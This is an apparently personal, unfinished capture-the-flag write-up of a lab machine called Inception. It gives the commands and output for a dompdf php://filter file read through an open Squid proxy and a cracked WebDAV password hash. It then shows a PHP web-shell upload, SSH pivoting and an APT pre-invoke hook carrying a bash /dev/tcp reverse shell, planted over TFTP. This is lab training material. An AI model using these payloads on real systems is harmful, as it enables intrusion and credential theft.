@@ -1,0 +1,333 @@
+
+
+
+
+checking the source of the webpage we find
+
+<!-- Todo: test dompdf on php 7.x -->
+
+there is a 
+http://10.10.10.67/dompdf/
+
+we see a version file indicating
+0.6.0
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit dompdf        
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                               | php/webapps/33004.txt
+dompdf 0.6.0 beta1 - Remote File Inclusion                                         | php/webapps/14851.txt
+
+
+The Squid proxy running on port 3128 requires no authentication. By adding it to
+proxychains.conf (http 10.10.10.67 3128), it is possible to force the server to run a port scan locally
+
+we setup http using foxy proxy
+
+"Using the exploit is fairly trivial. Using php://filter, it is possible to base64-encode a file on the
+target and add its contents to the generated PDF file. With this technique, it is possible to obtain
+the Apache default site configuration file from /etc/apache2/sites-enabled/000-default.conf"
+
+
+Web interface:
+
+http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
+
+we have to use the 127.0.0.1 because 10.10.10.67 returns access denied through the proxy
+
+http://127.0.0.1/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf
+
+we get a pdf download containing truncated base64, we must run strings on it to get the full output.
+
+...
+CgojIHZpbTogc3ludGF4PWFwYWNoZSB0cz00IHN3PTQgc3RzPTQgc3Igbm9ldAo=' |base64 -d
+...
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+
+...
+
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+...
+	Alias /webdav_test_inception /var/www/html/webdav_test_inception
+	<Location /webdav_test_inception>
+		Options FollowSymLinks
+		DAV On
+		AuthType Basic
+		AuthName "webdav test credential"
+		AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
+		Require valid-user
+	</Location>
+</VirtualHost>
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+                                                                                                                     
+
+we go for that webdav.passwd file
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'd2ViZGF2X3Rlc3RlcjokYXByMSQ4ck83U21pNCR5cW43SC5HdkpGdHNUb3UxYTdWTUUwCg==' |base64 -d
+webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+babygurl69       (?)     
+1g 0:00:00:00 DONE (2025-12-12 04:59) 14.28g/s 323657p/s 323657c/s 323657C/s mario12..ilovetodd
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+http://127.0.0.1/webdav_test_inception
+brings us to a login
+but using the creds returns a 403
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# davtest -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69 
+********************************************************
+ Testing DAV connection
+OPEN		SUCCEED:		http://10.10.10.67/webdav_test_inception
+********************************************************
+NOTE	Random string for this session: tDNUUuB
+********************************************************
+ Creating directory
+MKCOL		SUCCEED:		Created http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB
+********************************************************
+ Sending test files
+PUT	cfm	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.cfm
+PUT	pl	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.pl
+PUT	php	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.php
+PUT	aspx	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.aspx
+PUT	cgi	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.cgi
+PUT	txt	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.txt
+PUT	html	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.html
+PUT	jsp	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.jsp
+PUT	shtml	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.shtml
+PUT	jhtml	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.jhtml
+PUT	asp	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.asp
+********************************************************
+ Checking for test file execution
+EXEC	cfm	FAIL
+EXEC	pl	FAIL
+EXEC	php	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.php
+EXEC	php	FAIL
+EXEC	aspx	FAIL
+EXEC	cgi	FAIL
+EXEC	txt	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.txt
+EXEC	txt	FAIL
+EXEC	html	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.html
+EXEC	html	FAIL
+EXEC	jsp	FAIL
+EXEC	shtml	FAIL
+EXEC	jhtml	FAIL
+EXEC	asp	FAIL
+
+********************************************************
+/usr/bin/davtest Summary:
+Created: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.cfm
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.pl
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.php
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.aspx
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.cgi
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.txt
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.html
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.jsp
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.shtml
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.jhtml
+PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.asp
+Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.php
+Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.txt
+Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_tDNUUuB/davtest_tDNUUuB.html
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat shell.php                                                   
+<?php system($_GET["cmd"]); ?>
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl --upload-file revshell.php --user webdav_tester:babygurl69 http://10.10.10.67/webdav_test_inception/ 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>201 Created</title>
+</head><body>
+<h1>Created</h1>
+<p>Resource /webdav_test_inception/revshell.php has been created.</p>
+<hr />
+<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
+</body></html>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+http://10.10.10.67/webdav_test_inception/shell.php?cmd=id
+confirms code exec
+
+reverse shells, outbound connections, are not feasible on this machine. 
+so we upgrade to p0wny-shell
+
+stepping back into the webroot we find a wordpress directory.
+we cat wp-config.php
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
+
+
+we can ssh into the proxy. for this we use corkscrew or connect-proxy
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -o ProxyCommand="connect -H 10.10.10.67:3128 %h %p" cobb@127.0.0.1
+The authenticity of host '127.0.0.1 (<no hostip for proxy command>)' can't be established.
+ED25519 key fingerprint is SHA256:U0SGU+GVWTOFT70ijo+5sR0ic98xILeRExQn+xTYLyg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
+cobb@127.0.0.1's password: 
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
+cobb@Inception:~$ 
+
+cobb can run any command via sudo
+
+root@Inception:~# cat root.txt
+You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
+
+we copy nmap over, seeing there is no root.txt 
+
+┌──(root㉿kali)-[/home/kali]
+└─# scp -o ProxyCommand="connect -H 10.10.10.67:3128 %h %p" /home/kali/nmap cobb@127.0.0.1:/tmp/nmap
+cobb@127.0.0.1's password: 
+nmap                                                                               100% 5805KB   4.5MB/s   00:01    
+
+
+root@Inception:~# ip route
+default via 192.168.0.1 dev eth0 onlink 
+192.168.0.0/24 dev eth0  proto kernel  scope link  src 192.168.0.10 
+root@Inception:~# route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.0.1     0.0.0.0         UG    0      0        0 eth0
+192.168.0.0     0.0.0.0         255.255.255.0   U     0      0        0 eth0
+root@Inception:~# 
+
+
+
+
+root@Inception:/tmp# ./nmap -n -sT 192.168.0.1
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-12-12 19:53 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 192.168.0.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00016s latency).
+Not shown: 1202 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+53/tcp open  domain
+MAC Address: FE:46:17:E5:5A:FB (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
+root@Inception:/tmp# 
+
+
+anonymous login enabled
+
+root@Inception:/tmp# ftp 192.168.0.1
+Connected to 192.168.0.1.
+220 (vsFTPd 3.0.3)
+Name (192.168.0.1:cobb): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+
+
+
+
+
+ftp> get crontab
+local: crontab remote: crontab
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for crontab (826 bytes).
+226 Transfer complete.
+...
+
+root@Inception:/var/www/html/webdav_test_inception# ls
+crontab  DavTestDir_tDNUUuB  p0wny-shell.php  revshell.php  shell.php  webdav.passwd
+root@Inception:/var/www/html/webdav_test_inception# cat crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
+30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
+root@Inception:/var/www/html/webdav_test_inception# 
+
+
+we try to abuse the apt running by root every 5 minutes.
+
+root@Inception:/tmp# echo "APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/192.168.0.10/4433 0>&1'"}" > evil
+
+ftp> put evil /etc/apt/apt.conf.d/evil
+local: evil remote: /etc/apt/apt.conf.d/evil
+200 PORT command successful. Consider using PASV.
+550 Permission denied.
+
+
+
+via ftp, we check /etc/init.d and find tftpd-hpa
+
+the config file can be found in /etc/default confirming it runs as root.
+
+
+
+quoting was also incorrect on previous evil payload
+
+cobb@Inception:/tmp$ echo 'APT::Update::Pre-Invoke { "bash -c '\''bash -i >& /dev/tcp/192.168.0.10/4455 0>&1'\''"; };' > evil1
+
+cobb@Inception:/tmp$ tftp 192.168.0.1
+tftp> put evil1 /etc/apt/apt.conf.d/evil1
+Sent 86 bytes in 0.0 seconds
+
+still not working. will return
+
+
+
+
+
+
+
+
+
